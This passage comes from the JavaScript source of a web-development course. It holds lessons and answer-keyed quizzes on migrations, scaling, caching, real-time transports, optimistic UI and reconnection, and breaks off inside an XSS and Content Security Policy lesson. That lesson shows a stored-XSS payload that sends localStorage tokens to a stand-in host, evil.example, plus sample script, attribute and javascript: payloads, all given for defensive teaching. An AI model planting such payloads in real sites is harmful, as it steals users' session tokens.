So renaming a column in a single step is the classic outage. The moment it runs, every instance still on the old release throws \`no such column\`, and rolling back does not save you — the column is already gone. Do it across three releases instead:

| Release | Change |
|---|---|
| 1 — expand | Add the new nullable column; write to both |
| 2 — migrate | Backfill old rows; switch reads to the new column |
| 3 — contract | Drop the old column once nothing reads it |

Additive changes are safe. Renames, drops, and adding \`NOT NULL\` to an existing column are not.

### See what is happening

Emit one structured log line per request carrying the id from Chapter 6, and track three numbers: error rate, p95 latency, and throughput. Alert on symptoms a user would notice — a rising 5xx rate, an endpoint crossing its latency budget — not on CPU. An alert that has never once led to an action only teaches the team to ignore alerts.

### Triaging an incident

1. **Stop the bleeding first.** Roll back, or switch the feature flag off. Diagnosis comes after the site is up.
2. **Ask what changed.** A deploy, a config edit, a traffic spike, a certificate that expired at midnight.
3. **Narrow by layer**, exactly as in Chapter 6: browser, API, database.
4. **Write the timeline down while it is happening.** You will not remember the order tomorrow.
5. **Write it up blamelessly afterwards** — what happened, why, and the one change that prevents a repeat. A postmortem ending in "be more careful" changes nothing; one ending in "add a \`UNIQUE\` constraint" changes everything.

### Feature flags separate deploying from releasing

A rollback takes minutes and reverts everything in the release. A flag takes seconds and reverts one thing:

\`\`\`js
// Ship the code dark, enable it for yourself, then for 1%, then for everyone
if (flags.newCertificateRenderer) {
  return renderWithNewPipeline(enrolment);
}
return renderLegacy(enrolment);
\`\`\`

Read flags from configuration, never from a constant that needs a redeploy to change — otherwise "turn the feature off" during an incident is just another deploy, at the worst possible moment. Flags also let a risky change reach 1% of traffic on a Tuesday morning rather than everyone at once on a Friday night.

Then delete the flag and the dead branch once the feature has settled. A codebase carrying twenty permanent flags is a codebase with a million untested combinations, and nobody can tell you which one a given user is running.

### Keep deploys small

Ten small releases are far easier to diagnose than one large one: when something breaks, the suspect list is a few lines rather than a month of work. Small and reversible beats big and careful.
        `,
        [
          q('Why does the CI job run npm ci instead of npm install?', [
            'npm ci is the only command that works without a network',
            'It installs exactly the locked tree and fails loudly if the lock file is stale',
            'npm install cannot run in GitHub Actions',
            'npm ci skips devDependencies, keeping the job fast',
          ], 1, 'CI must test the same dependency tree you tested locally, and npm install is free to resolve something different.'),
          q('An incident starts. What comes first?', [
            'Stop the bleeding — roll back or turn the flag off, then diagnose',
            'Find the root cause before touching production',
            'Notify every stakeholder',
            'Write the postmortem while details are fresh',
          ], 0, 'Diagnosis is much cheaper on a site that is up, so recovery precedes investigation.'),
          q('Why delete a feature flag once the feature has settled?', [
            'Flags slow down every request they guard',
            'Flag libraries charge per flag',
            'Old flags stop new ones from being created',
            'Permanent flags multiply the untested combinations the codebase can run in',
          ], 3, 'Twenty lingering flags mean a million possible configurations and no way to say which one a user is on.'),
        ]),
        lesson('Scaling Beyond One Process', 14, `
One Node process uses one CPU core. The first answer to more traffic is more processes — a second container, a third instance, a load balancer in front — and the moment there are two, every assumption about "the server" remembering something quietly breaks.

### Anything in memory is per-instance

\`\`\`js
const attempts = new Map();       // lives in this process, and only this process
\`\`\`

Behind three instances, a rate limiter built on that Map allows roughly three times the limit, because each process only sees a third of the requests. An in-process cache serves three different answers depending on where the load balancer sent you. An uploaded file written to local disk exists on one machine and 404s on the other two.

The rule is short: **a process may hold nothing that the next request needs.** Shared state goes in a shared store — Redis for counters, sessions, and caches; the database for anything durable; object storage for files.

\`\`\`js
app.use('/api/', rateLimit({ store: new RedisStore({ client }), windowMs: 60_000, max: 60 }));
\`\`\`

Stateless processes are also what make the tokens of Chapter 5 easier than server-held sessions: any instance can verify a signature without asking anybody else.

### Cache with a key and an expiry

\`\`\`js
const KEY = 'courses:list';

export async function listCourses() {
  const hit = await redis.get(KEY);
  if (hit) return JSON.parse(hit);

  const rows = await repo.listCourses();
  await redis.set(KEY, JSON.stringify(rows), { EX: 300 });   // five minutes
  return rows;
}

export async function publishCourse(data) {
  const course = await repo.insert(data);
  await redis.del(KEY);        // invalidate on write, or serve stale data for five minutes
  return course;
}
\`\`\`

Every cache needs an answer to one question: what makes this entry wrong, and what clears it when that happens? A TTL on its own means your worst case is staleness for the length of the TTL — acceptable for a catalogue, never acceptable for a balance.

Watch for the **stampede** too: when a popular key expires under load, every request misses at once and they all hit the database together. A short lock, or a refresh slightly before expiry, keeps that to one query.

### Move slow work out of the request

\`\`\`js
// The user waits for a PDF render and an SMTP round trip
await renderCertificate(id);
await sendEmail(user.email, pdf);
res.json({ ok: true });

// Hand it off and answer immediately
await queue.add('certificate', { enrolmentId: id });
res.status(202).json({ status: 'queued' });
\`\`\`

\`202 Accepted\` means "understood, not finished yet". A separate worker process consumes the queue, so slow or flaky third parties stop holding connections open in your API.

Queues retry, which means **a job can run twice**: a worker that crashes after sending the email but before marking it sent gets handed the same job again. Make jobs idempotent — check whether the certificate already exists, or key the send on the enrolment id — or the learner receives four copies of it.

### Shut down politely

\`\`\`js
process.on('SIGTERM', () => {
  server.close(() => db.close());   // stop accepting, let in-flight requests finish
});
\`\`\`

Every deploy sends \`SIGTERM\`. Without this, the requests in flight at that instant are dropped, and a rolling release produces a scatter of unexplained errors nobody can reproduce afterwards.

### Reach for the boring lever first

Doubling the instances doubles the load on the one database they all share, and the connection pool is finite. Fix the N+1 and add the index first, cache second, add machines third — and measure at each step, because capacity you cannot explain is capacity you cannot rely on.
        `,
        [
          q('A login rate limiter counts attempts in a module-level Map. What happens behind three instances?', [
            'The limit works, because the load balancer pins each user to one instance',
            'Every request is rejected once any instance reaches the limit',
            'Each instance counts separately, so roughly three times the intended attempts get through',
            'The Map is shared automatically by the Node cluster module',
          ], 2, 'Process memory is not shared, so each instance enforces the limit against only the share of traffic it sees.'),
          q('Why enqueue certificate generation and return 202 instead of doing the work in the handler?', [
            'Queues make PDF rendering faster',
            'The request answers immediately and a worker does the slow, retryable work separately',
            '202 tells the browser to poll every second',
            'It avoids having to validate the input',
          ], 1, 'Handing slow third-party work to a worker keeps request latency and connection use under your control.'),
          q('Why must a queued job be idempotent?', [
            'Because jobs run in an unpredictable order',
            'Because workers share a database connection',
            'Because the queue stores jobs as JSON',
            'Because a worker that crashes mid-job gets handed the same job again',
          ], 3, 'At-least-once delivery means a job can execute twice, so running it twice must not send the email twice.'),
        ]),
      ],
      [
        q('A list endpoint runs one query for 50 courses, then one query per course for its chapters. Best fix?', [
          'Add an index on courses.id',
          'Fetch every chapter in one batched query and group the rows in memory',
          'Cache the whole response for five minutes',
          'Raise the database connection pool size',
        ], 1, 'N+1 is a round-trip problem, so collapsing it to two queries removes the per-row network latency that only appears in production.'),
        q('You have an index on (userId, lessonId). Which query cannot use it?', [
          'WHERE userId = ?',
          'WHERE userId = ? AND lessonId = ?',
          'WHERE userId = ? ORDER BY lessonId',
          'WHERE lessonId = ?',
        ], 3, 'A composite index is only usable from its leftmost column onward, so filtering on the second column alone still scans the table.'),
        q('You wrapped CourseCard in memo() and it still re-renders every time. Why?', [
          'The parent passes a new object or arrow function as a prop on every render',
          'memo only works on class components',
          'memo requires a key prop to compare against',
          'The component calls useState internally',
        ], 0, 'memo compares props by reference, and a freshly created object or function is never equal to the previous one.'),
        q('Why is renaming a database column in a single migration unsafe?', [
          'ALTER TABLE locks the table until the deploy finishes',
          'Column names are cached by the database driver',
          'The previous version of the code is still running during the rollout and after any rollback',
          'Migrations cannot be applied while the server is live',
        ], 2, 'Old code and new schema have to coexist, which is why a rename needs separate expand, migrate, and contract releases.'),
      ]
    ),
      chapter(
      'Real-Time and Event-Driven Features',
      'Pushing updates to the browser as they happen, and keeping every server instance, every open tab, and every flaky connection in agreement.',
      [
      lesson('Choosing Between Polling, SSE, and WebSockets', 13, `
A cohort dashboard polls \`/api/cohorts/42/progress\` every two seconds. Four hundred mentors keep it open through an exam window, which is 200 requests a second, and about 199 of them return exactly the bytes they returned two seconds earlier. The page feels live. The database does not enjoy it.

Four transports can put fresh data in front of a user. The choice comes down to who speaks first, and how often there is anything to say.

### The honest comparison

| Approach | Who speaks | Delay | Cost while nothing happens |
|---|---|---|---|
| Polling | client asks on a timer | up to one interval | a request per client per interval |
| Long polling | client asks, server holds | near instant | one parked request per client |
| SSE | server writes into an open response | near instant | one open response per client |
| WebSocket | either side, any time | near instant | one open socket per client |

Polling is not the embarrassing option people treat it as. Made conditional, it is close to free:

\`\`\`http
GET /api/cohorts/42/progress HTTP/1.1
If-None-Match: "progress-v8814"
\`\`\`

\`\`\`http
HTTP/1.1 304 Not Modified
ETag: "progress-v8814"
\`\`\`

A \`304\` carries no body, and if the ETag comes from a cheap \`MAX(updated_at)\` lookup you skip the expensive aggregate entirely. For a leaderboard that moves every few minutes, polling with an ETag beats a socket: no connection state, no reconnect code, and a rolling deploy that restarts every instance costs one failed request instead of a reconnect storm.

Reach past polling when the update has to land in under a second, or when the interval you would need is short enough to cost more than an open connection.

### Server-sent events

SSE runs one direction only, server to client, over an ordinary HTTP response that never ends.

\`\`\`js
router.get('/api/cohorts/:id/stream', requireAuth, (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache, no-transform',
    'X-Accel-Buffering': 'no',
  });
  res.write('retry: 3000\\n\\n');

  const room = \`cohort:\${req.params.id}\`;
  const send = (e) => res.write(\`id: \${e.seq}\\nevent: progress\\ndata: \${JSON.stringify(e)}\\n\\n\`);
  const beat = setInterval(() => res.write(': keep-alive\\n\\n'), 15000);

  bus.on(room, send);
  req.on('close', () => { clearInterval(beat); bus.off(room, send); });
});
\`\`\`

The client is three lines, and the browser handles reconnection itself:

\`\`\`js
const es = new EventSource('/api/cohorts/42/stream');
es.addEventListener('progress', (e) => apply(JSON.parse(e.data)));
\`\`\`

Two things bite here. \`X-Accel-Buffering: no\` exists because nginx buffers proxied responses by default, so your events sit in a buffer until several kilobytes accumulate and the stream looks broken for the first few minutes. And over HTTP/1.1 a browser allows six connections per origin, so a user with six tabs open has a seventh that loads nothing at all, because the open streams have eaten every slot. HTTP/2 multiplexes about a hundred streams down one connection, which is what made SSE practical again.

### WebSockets

Pick a WebSocket when the client also sends, and sends often: chat, a cursor in a shared document, a collaborative whiteboard. It begins as an HTTP request carrying \`Upgrade: websocket\`, then leaves HTTP behind, and that is the price. No status codes, no ETags, no per-message cookies, no automatic reconnect. You write the heartbeat and the backoff yourself.

\`\`\`js
const ws = new WebSocket(\`wss://\${location.host}/ws?cohort=42\`);
ws.onmessage = (m) => apply(JSON.parse(m.data));
\`\`\`

A submit button pressed once a minute does not need a socket. \`fetch\` posts it, and the result arrives on whatever stream is already open.

### Pick by shape, not by novelty

| Feature | Transport that fits |
|---|---|
| Catalogue enrolment counts | polling with an ETag every 30s |
| Live lesson progress for a cohort | SSE |
| Cohort chat | WebSocket |
| Certificate finished rendering | SSE, or a poll on the 202 |

Whichever you choose, remember the browser is not the only party holding the connection. A load balancer with a 60 second idle timeout will cut a stream that has been quiet for 61 seconds, which is the entire reason for that keep-alive comment above.
      `,
        [
          q('An SSE endpoint works on localhost, but in production the first events only arrive minutes later, all at once. What is the likely cause?', [
            'The browser allows only six SSE connections per origin',
            'The client never called close() when the component unmounted',
            'The server sent an event: line without a matching id: line',
            'A reverse proxy is buffering the response until its buffer fills',
          ], 3, 'Proxies buffer ordinary HTTP responses by default, so an unending stream is held back until enough bytes accumulate; turning buffering off for that route sends each event straight through.'),
          q('A user opens seven tabs of your dashboard over HTTP/1.1 and the seventh loads nothing at all. Why?', [
            'Six open streams have used every connection the browser allows that origin',
            'EventSource refuses to register more than six listeners per event name',
            'The server exhausted its file descriptors once six clients connected',
            'Browsers cap an origin at six cookies, so the seventh tab sends none',
          ], 0, 'HTTP/1.1 caps concurrent connections per origin at roughly six, and a never-ending SSE response holds one of those slots for as long as the tab is open.'),
          q('Which requirement is the one that genuinely pushes you off SSE and onto a WebSocket?', [
            'Updates have to reach the screen within a second of happening',
            'The client sends messages many times a second, not only receives',
            'The payloads are JSON objects rather than plain lines of text',
            'The connection has to survive a laptop waking up from sleep',
          ], 1, 'SSE is server to client only, so frequent client-to-server traffic is the case a bidirectional socket handles and SSE cannot.'),
        ]
      ),
      lesson('Broadcasting Across Every Instance', 13, `
Chat worked perfectly in review. In production, roughly two thirds of messages never reach a given learner, and it is never the same two thirds twice. Nothing is wrong with the chat code. There are three instances behind the load balancer, and \`io.emit()\` only knows about the sockets attached to the process that called it.

### The broken version

\`\`\`js
// instance A holds Ayesha's socket, instance B holds Bilal's
io.on('connection', (socket) => {
  socket.on('message', async (text) => {
    const msg = await repo.saveMessage({ cohortId: socket.data.cohortId, text });
    io.to(\`cohort:\${msg.cohortId}\`).emit('message', msg);   // this process only
  });
});
\`\`\`

That is the rule from Chapter 7 about rate limiters and in-process caches, wearing a different hat: a process may hold nothing that the next request needs. A connection is state, and it is pinned to one machine.

### Publish once, deliver everywhere

Put a message bus between the instances. Every instance subscribes, the instance that handled the write publishes, and all three then push to whichever of their own sockets care.

\`\`\`js
const pub = redis.duplicate();
const sub = redis.duplicate();

await sub.subscribe('cohort-events', (raw) => {
  const msg = JSON.parse(raw);
  io.to(\`cohort:\${msg.cohortId}\`).emit('message', msg);   // local fan-out
});

socket.on('message', async (text) => {
  const msg = await repo.saveMessage({ cohortId: socket.data.cohortId, text });
  await pub.publish('cohort-events', JSON.stringify(msg));
});
\`\`\`

\`duplicate()\` is not politeness. A Redis client in subscriber mode refuses ordinary commands, so subscribing on the client you also use for \`GET\` and \`SET\` makes the next cache read throw. Socket.IO ships an adapter that does all of the above for you, and reaching for it is the sensible default. Write it by hand once anyway, so you know what the adapter is doing on your behalf.

Note the order: save, then publish. Publish first and a client can render a message that the database rejects half a second later.

### Rooms keep the fan-out honest

Every instance receives every published event. Without rooms, each one then serialises that payload for every socket it holds, so a twelve person cohort chat gets delivered to three thousand connected learners. \`socket.join('cohort:42')\` at connection time turns that into three sends.

Authorisation belongs at join time, not at emit time:

\`\`\`js
socket.on('join', async ({ cohortId }) => {
  if (!(await canRead(socket.data.userId, cohortId))) {
    return socket.emit('denied', { cohortId });
  }
  socket.join(\`cohort:\${cohortId}\`);
});
\`\`\`

There is a trap in that. A socket authenticates once, at the handshake, then stays open for hours. Remove a mentor from a cohort at 14:05 and their socket keeps receiving that room until something kicks it out. Emitting a \`revoked\` event that calls \`socket.leave()\` is the cheap fix. A short-lived token that forces a reconnect is the thorough one.

### Pub/sub forgets

Redis pub/sub is at-most-once and has no memory. An instance restarting mid deploy misses every event published in that second, and nothing replays it. Fine for a typing indicator. Not fine for the record of what was said.

The pattern that survives it: the database holds the truth, and the event is a hint that the truth changed.

| Payload style | What the client does | Failure mode |
|---|---|---|
| The full row | renders it directly | a dropped event loses data until a reload |
| Just \`{ id, seq }\` | fetches or reconciles | a dropped event costs one stale render |

Sending an id and a sequence number also settles a quieter problem. The event fans out to every instance, but not every listener may be allowed to see that row. A full payload leaks it the first time a room membership is wrong. An id sends the client back through the same authorisation as every other request.
      `,
        [
          q('Chat delivers every message on one process and drops most of them behind three. What is the direct cause?', [
            'The load balancer is stripping the WebSocket upgrade header',
            'Redis is evicting the messages before they can be delivered',
            'An emit only reaches sockets held by the process that called it',
            'The database write is committing after the broadcast was sent',
          ], 2, 'Socket connections live in one process, so a broadcast issued there is invisible to clients attached to the other instances until a shared bus carries it.'),
          q('Why must the Redis subscriber be a duplicated client rather than the one used for caching?', [
            'A client in subscriber mode rejects ordinary commands such as GET',
            'A single client can hold only one active subscription at a time',
            'Subscriptions and cached values live in different Redis databases',
            'Publishing and reading on one client deadlocks the Node event loop',
          ], 0, 'Once a connection enters subscriber mode it accepts only subscription commands, so sharing it with cache reads makes the next GET throw.'),
          q('Redis pub/sub delivers at most once and never replays. Which design copes best with a dropped event?', [
            'Publish the whole row so no client ever needs to fetch again',
            'Publish each event twice and let clients discard the duplicate',
            'Buffer recent events in each instance\'s memory for one minute',
            'Write to the database first and treat the event as a hint to refetch',
          ], 3, 'When the database is the source of truth, a lost event costs one stale render rather than lost data, because the next fetch repairs the client.'),
        ]
      ),
      lesson('Optimistic UI and the Server\'s Last Word', 13, `
Tap the bookmark on a lesson and the icon fills instantly. One hundred and eighty milliseconds later the API answers \`403\`, because the enrolment expired at midnight. The icon stays filled until the next refresh, and the learner walks away believing that lesson is saved.

Optimistic UI is a promise the client makes on the server's behalf. Making the promise is easy. Keeping the books straight when it gets broken is the actual work.

### Predict, reconcile, roll back

The broken version applies the change and hopes:

\`\`\`js
async function toggleBookmark(lesson) {
  setBookmarked(true);                                // instant
  await api.post(\`/lessons/\${lesson.id}/bookmark\`);   // nobody reads the result
}
\`\`\`

The fixed version remembers what it overwrote:

\`\`\`js
async function toggleBookmark(lesson) {
  const previous = bookmarked;
  setBookmarked(true);
  try {
    const saved = await api.post(\`/lessons/\${lesson.id}/bookmark\`);
    setBookmarked(saved.bookmarked);       // the server's answer wins
  } catch (err) {
    setBookmarked(previous);               // put it back
    toast('Could not save that bookmark');
  }
}
\`\`\`

Three rules fall out of that shape. Predict only what you can predict correctly. Reconcile against what the server actually returned instead of assuming your guess was right. Roll back visibly, because a silent revert reads as a bug the user cannot describe.

### The echo problem

Now add the broadcast from the previous topic. Ayesha posts a comment, her client renders it immediately, the server saves it and publishes it to the room, and her own client receives her own comment back. She sees it twice.

Give the client a way to recognise itself:

\`\`\`js
const draft = { id: \`tmp-\${crypto.randomUUID()}\`, body, author: me, pending: true };
setComments((cs) => [...cs, draft]);

const saved = await api.post('/comments', { body, clientRef: draft.id });
setComments((cs) => cs.map((c) => (c.id === draft.id ? saved : c)));
\`\`\`

The server stores \`clientRef\` and echoes it in the broadcast, so any subscriber can drop an event whose \`clientRef\` matches a row it already holds. Deduplicating on body text and timestamp instead looks fine right up until somebody sends the same message twice on purpose.

### Late events and stale writes

Events do not arrive in the order they were created. A progress bar fed by two events, \`82\` published at 14:03:01 and \`85\` at 14:03:02, can render 85 then 82 and stay there, because the network reordered them or one instance was busier than the other.

Version the row, not the moment:

\`\`\`js
setProgress((p) => (event.version > p.version ? event : p));
\`\`\`

A monotonic \`version\` column bumped on every write works. So does the sequence number from an event log. A client clock does not: two laptops disagree by minutes, and one of them has the wrong date entirely.

The same reasoning rules out sending deltas over an unreliable channel. \`+3%\` applied twice is wrong forever, while \`85\` applied twice is still \`85\`. Absolute values are self healing.

| Action | Optimistic? | Why |
|---|---|---|
| Toggle a bookmark | yes | reversible, predictable, frequent |
| Reorder a playlist | yes | the local result matches the server's |
| Mark a lesson complete | yes, with rollback | can fail on an expired enrolment |
| Buy a course | no | show a pending state and wait |
| Delete an account | no | there is nothing to roll back to |

The rule under that table: be optimistic when you already know the answer and the cost of being wrong is a visual correction. Wait when the cost of being wrong is money, data, or a promise you cannot take back.

### Pending is a state, not a feeling

A comment nobody has acknowledged yet should not look identical to one that is saved. Dim it, or show a small clock against it. Otherwise the difference between sent and saved is invisible, and the first thing a flaky connection does is turn your interface into a liar.
      `,
        [
          q('An optimistic toggle updates local state and never inspects the response. What does the user see when the API returns 403?', [
            'An error toast, because the rejected promise unmounts the component',
            'The change still applied, so the interface disagrees with the server',
            'The previous value, because React reverts state on a failed request',
            'No change at all, because the update was queued behind the request',
          ], 1, 'Nothing rolls the guess back, so the optimistic value stays on screen and the user believes a change happened that the server refused.'),
          q('Why does the client attach a clientRef to an optimistically rendered comment?', [
            'It lets the server order concurrent writes from different authors',
            'It replaces the database id, so no second lookup is ever needed',
            'It lets the client match the broadcast to the row it already added',
            'It proves the request came from an authenticated browser session',
          ], 2, 'The reference is echoed back in the broadcast, so the author\'s own client recognises its own message instead of rendering it a second time.'),
          q('Progress events for 82 and 85 arrive out of order and the bar sticks at 82. Which fix actually holds?', [
            'Sort incoming events by the time the client received each one',
            'Have the server publish only the newest event once per second',
            'Send the change as a delta rather than as an absolute value',
            'Ignore any event whose version is not higher than the rendered one',
          ], 3, 'A monotonic version assigned by the server lets the client reject anything older than what it already shows, which client clocks and arrival times cannot do reliably.'),
        ]
      ),
      lesson('Reconnects, Backfill, and Offline Writes', 13, `
Close the laptop lid at 14:10, open it at 14:52. The dashboard still says Connected. The \`WebSocket\` object still reports \`readyState === 1\`. Every number on the screen is forty two minutes old, and nothing in the stack is going to mention it.

A TCP connection whose far end vanished without sending a FIN is half open. Your side has no way to know. The only cure is to ask.

### Prove the connection, do not trust it

\`\`\`js
let lastPong = Date.now();

const beat = setInterval(() => {
  if (Date.now() - lastPong > 30000) { ws.close(); return; }   // dead, so treat it as dead
  ws.send(JSON.stringify({ type: 'ping' }));
}, 10000);

ws.addEventListener('message', (m) => {
  const msg = JSON.parse(m.data);
  if (msg.type === 'pong') { lastPong = Date.now(); return; }
  apply(msg);
});
\`\`\`

The server needs the mirror image of that, because a socket nobody closed still costs a file descriptor and a slot in every room it joined. Calling \`ws.terminate()\` on a client that has missed two heartbeats is what stops a browser that crashed at lunchtime from leaving ghosts in the room list all afternoon.

Heartbeats have a second job. Load balancers and corporate proxies close idle connections, often at 60 seconds, so a ping every 10 or 25 seconds is also what keeps the path from being cut underneath you.

### Back off, and add jitter

A deploy restarts three instances. Eight thousand browsers notice in the same instant and reconnect one second later, together, and the fresh instances fall over under a handshake storm that then repeats every second.

\`\`\`js
let attempt = 0;

function connect() {
  const ws = new WebSocket(url);
  ws.onopen = () => { attempt = 0; backfill(); };
  ws.onclose = () => {
    const base = Math.min(1000 * 2 ** attempt, 30000);   // 1s, 2s, 4s, up to 30s
    attempt += 1;
    setTimeout(connect, base * (0.5 + Math.random()));   // spread across the window
  };
}
\`\`\`

The jitter matters more than the backoff. Exponential retry without it keeps every client perfectly synchronised: the herd arrives together at one second, together at two, together at four.

### Backfill from a cursor, not from a buffer

Reconnecting is not the hard part. The gap is. Things happened while you were away, and the stream will not repeat them.

The wrong instinct is a per-client buffer on the server, which makes the server hold state for clients that may never come back. Ask instead:

\`\`\`js
async function backfill() {
  const res = await api.get(\`/api/cohorts/42/events?since=\${lastSeq}\`);
  for (const e of res.events) apply(e);
  lastSeq = res.cursor;
}
\`\`\`

\`lastSeq\` is a server-assigned sequence number, kept in memory and mirrored into \`localStorage\` so a refresh does not start again from zero. SSE hands you the same mechanism for free: send \`id:\` with every event, and after a drop the browser reconnects with a \`Last-Event-ID\` header carrying the last id it saw.

Cap the size of the answer. A tab left open over a weekend asks for four thousand events, so refuse politely:

\`\`\`json
{ "events": [], "truncated": true, "cursor": 91204 }
\`\`\`

\`truncated\` means "you are too far behind, refetch the page state from scratch". One clean reload is cheaper than replaying a weekend, and far easier to reason about.

### Writes made while offline

Reads recover with a cursor. Writes need a queue.

| Decision | The choice that survives real users |
|---|---|
| Where the queue lives | IndexedDB, so it outlives a tab crash |
| What each item carries | a stable key generated at queue time |
| When it flushes | on reconnect, oldest first, one at a time |
| What a failure does | keep \`5xx\` and network errors, drop \`4xx\` |

The stable key is the load-bearing part. A queued "mark complete" retried after a timeout must not create two records, which is the idempotency key of Chapter 10 arriving early. Generate it when the action is queued, never when it is sent, or every retry looks like a brand new request.

Dropping \`4xx\` matters just as much. A request the server called invalid at 09:00 is still invalid at 11:00, and a queue that keeps retrying it never drains.
      `,
        [
          q('A laptop sleeps for forty minutes and the socket still reports an open state. Why does that happen?', [
            'The far end disappeared without a FIN, so neither side learns it died',
            'readyState is only recalculated when the application sends a message',
            'The browser freezes and restores socket state around a sleep cycle',
            'The client library reconnected silently and kept stale data on screen',
          ], 0, 'A half-open TCP connection looks alive locally because no close was ever exchanged, which is why an application-level heartbeat is the only reliable detector.'),
          q('Why add random jitter on top of an exponential reconnect delay?', [
            'It stops the computed delay from growing past the cap you set',
            'It spreads clients out instead of letting them retry in one wave',
            'It gives clients on slow networks priority over faster clients',
            'It makes each attempt land on a different instance behind the balancer',
          ], 1, 'Pure exponential backoff keeps every client synchronised, so thousands of browsers retry in the same instant and knock over the instances they just reconnected to.'),
          q('A tab left open all weekend reconnects and asks for everything since its cursor. What should the endpoint do?', [
            'Return every missed event so the client stays exactly consistent',
            'Reject the request and make the client sign in again to continue',
            'Return a truncated marker so the client refetches the page state',
            'Reset that client\'s cursor to zero and replay the log from the start',
          ], 2, 'Replaying thousands of events is slower and riskier than one clean refetch, so the server tells the client it is too far behind and to start from current state.'),
        ]
      ),
      ],
      [
      q('A notification must reach the browser within a second, and the client never sends anything back on that channel. What is the smallest thing that works?', [
        'A WebSocket, since only a socket can push from the server',
        'Server-sent events, which push one way and reconnect on their own',
        'Polling once a second with a conditional request and an ETag',
        'Long polling, holding one parked request open per connected client',
      ], 1, 'SSE covers server to client push over plain HTTP with reconnection and event ids built in, so a bidirectional socket adds work without adding capability here.'),
      q('Your Socket.IO app broadcasts correctly on one process and unevenly on four. What is missing?', [
        'Sticky sessions pinning every client to one instance permanently',
        'A larger connection pool so each instance can reach the database',
        'A shorter heartbeat interval to hold the connections open longer',
        'An adapter that carries emitted events between the processes',
      ], 3, 'Each process only sees its own sockets, so events have to travel over a shared bus before every instance can deliver them locally.'),
      q('Which single change makes an optimistic update safe to keep in the interface?', [
        'Store the previous value and restore it when the request fails',
        'Send the request first and apply the local change afterwards',
        'Disable the control entirely until the response has arrived',
        'Apply the same change a second time once the response arrives',
      ], 0, 'Rollback is what separates an optimistic update from a lie, because the interface can return to the last state the server confirmed.'),
      q('After a dropped connection, why prefer a since-cursor endpoint over a per-client buffer on the server?', [
        'A cursor delivers the missed events faster than a buffer replay can',
        'A buffer cannot preserve the order in which events were created',
        'The server would hold state for clients that may never come back',
        'A cursor removes the need to authorise the reconnecting client again',
      ], 2, 'Per-client buffers make an otherwise stateless server accumulate memory for absent clients, while a cursor lets any instance answer the question from durable storage.'),
      ]
    ),
    chapter(
      'Security Beyond the Login Form',
      'The attacks that still work against an application that already hashes passwords, and the defences that close them.',
      [
      lesson('Cross-Site Scripting and a Content Security Policy', 13, `
A learner posts this into the discussion box under lesson 3 and hits save:

\`\`\`html
<img src=x onerror="fetch('https://evil.example/c?t='+localStorage.token)">
\`\`\`

Nothing visible renders. The image fails, \`onerror\` fires, and the session token of every person who opens that page walks out to a server you do not control. No password was guessed. No firewall was crossed. You served the attacker's code yourself, from your own origin, with your own cookies attached.

That is stored XSS, and it keeps happening because the fix feels like it is already done.

### React escapes text, and only text

\`{comment.body}\` is safe: React writes a text node, so \`<img ...>\` shows up as literal characters. Most React apps are secure by accident. Three holes survive that accident:

1. \`dangerouslySetInnerHTML\`, usually inside a markdown renderer.
2. Attributes that can execute, such as \`href\` and \`src\`.
3. Anything built with \`innerHTML\`, \`document.write\`, or a third party widget that accepts an HTML label.

Hole one is the one this platform walks into. Lesson bodies are markdown written by you, so rendering them as HTML is fine. Comments are markdown written by strangers, and they go through the same pipeline:

\`\`\`jsx
// Broken: the parser is told to pass raw HTML through, and it does
<div dangerouslySetInnerHTML={{ __html: marked(comment.body) }} />
\`\`\`

\`\`\`jsx
import DOMPurify from 'dompurify';

const html = DOMPurify.sanitize(marked(comment.body), {
  ALLOWED_TAGS: ['p', 'strong', 'em', 'code', 'pre', 'a', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href'],
});

<div dangerouslySetInnerHTML={{ __html: html }} />
\`\`\`

Sanitise on the way out, not on the way in. Store what the learner actually typed, because sanitiser rules change, your allowlist will get an extra tag next quarter, and a value mangled at write time is gone forever.

### Escaping depends on where the value lands

| Where it lands | Payload that bites | What actually protects you |
|---|---|---|
| HTML text | \`<script>alert(1)</script>\` | A text node, which React gives you free |
| Attribute value | \`" onmouseover="steal()\` | Quoted, escaped attributes or JSX props |
| \`href\` or \`src\` | \`javascript:alert(document.cookie)\` | Allowlist the \`http\` and \`https\` schemes |
| Inside a \`<script>\` | \`</script>\` closing your block early | Never interpolate, pass data as JSON |

Row three catches good teams. \`<a href={profile.website}>\` is escaped correctly by React and still runs script on click, because escaping protects the attribute syntax and says nothing about the scheme.

### A Content Security Policy is the second wall

Sanitising stops the injection. CSP assumes one got through anyway and refuses to run it. \`helmet()\` from Chapter 4 sets a starting policy, but the useful version is configured:

\`\`\`js
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", (req, res) => \`'nonce-\${res.locals.nonce}'\`],
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
    frameAncestors: ["'none'"],
  },
}));
\`\`\`

Every \`<script>\` you ship carries \`nonce="{{nonce}}"\`. The injected \`onerror\` above carries nothing, so the browser blocks it.

Here is the trap. Your first strict policy breaks an inline analytics snippet, someone adds \`'unsafe-inline'\` to \`script-src\` to unblock the release, and the policy now permits exactly the class of payload it was added to stop. Inline handlers are how XSS executes. Browsers ignore \`'unsafe-inline'\` whenever a nonce is present, which gives you a migration path rather than an excuse.

Roll it out with \`Content-Security-Policy-Report-Only\` and a reporting endpoint for a week first. You want to discover the four things you forgot in a report, not in a support ticket at 9am on launch day.
      `,
        [
          q('A comment body is run through a markdown parser with raw HTML enabled and rendered with dangerouslySetInnerHTML. Which change closes the hole?', [
            'Strip angle brackets from the comment before storing the row',
            'Serve the page over HTTPS so the payload cannot be injected',
            'Sanitise the generated HTML against a tag allowlist at render',
            'Move the session token out of localStorage into a variable',
          ], 2, 'The parser is producing HTML on purpose, so the only thing standing between a stranger\'s comment and executing script is an allowlist sanitiser applied to that HTML before it reaches the DOM.'),
          q('Why does adding \'unsafe-inline\' to script-src defeat the point of a Content Security Policy?', [
            'The injected onerror handler is inline script, which is then permitted',
            'It switches off the default-src directive for every other resource',
            'Browsers stop sending the header once that keyword is present',
            'It permits scripts from any external host as well as your own',
          ], 0, 'Almost every XSS payload runs as an inline handler or an inline script block, so allowing inline script leaves open exactly the case the policy was added to block.'),
          q('A profile page renders a link as href={profile.website}. What risk does React\'s escaping leave open?', [
            'The link text can contain HTML entities that render as markup',
